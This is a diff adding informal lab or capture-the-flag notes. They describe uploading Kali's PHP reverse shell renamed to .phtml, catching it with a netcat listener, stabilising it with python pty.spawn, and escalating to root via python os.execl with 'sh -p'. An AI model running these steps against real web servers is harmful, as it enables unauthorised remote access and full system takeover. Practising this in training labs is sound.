@@ -1,0 +1,22 @@
+Process
+
+take the file on kali : /usr/share/webshells/php/php-reverse-shell.php
+	change the ip and the port as you want with nano . after mv the file to put the .phtml extension and upload this on a form
+	
+	start listenning on the port , the one who you change in nano, on a other terminal : with netcat : nc -lnvp [port ]
+	
+	than you will launch the script by going to the folder il web server and double click on to launch.
+	
+	after that you have an instable shell . To make it's stable, do python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+	
+	after doing that you have a reverse shell on the web serveur target .
+	 
+	
+	after to elevate private with that file , run this : python3 -c 'import os;os.execl("/bin/sh", "sh" , "-p")'
+	
+	now you are root
+	
+	
+	
+	
